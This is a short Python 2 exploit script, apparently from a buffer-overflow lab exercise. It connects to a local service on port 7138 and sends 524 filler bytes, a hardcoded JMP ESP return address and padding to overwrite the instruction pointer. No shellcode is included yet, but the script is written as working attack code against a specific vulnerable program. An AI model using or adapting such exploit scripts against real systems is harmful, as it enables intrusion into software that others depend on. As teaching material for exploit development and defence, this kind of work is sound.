#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#JMP ESP = 311712F3

buffer = "A"*524 + "\xf3\x12\x17\x31" + 'C'*(1400-524-4) 

#'A' * 600


try:
    print "\n Sending Malicious Code to Buffer..."
    s.connect(('127.0.0.1', 7138))
    data = s.recv(1024)
    s.send(buffer + '\r\n')
    print "\nBuffer Overflowed"

except:
    print "Could not connect to application"
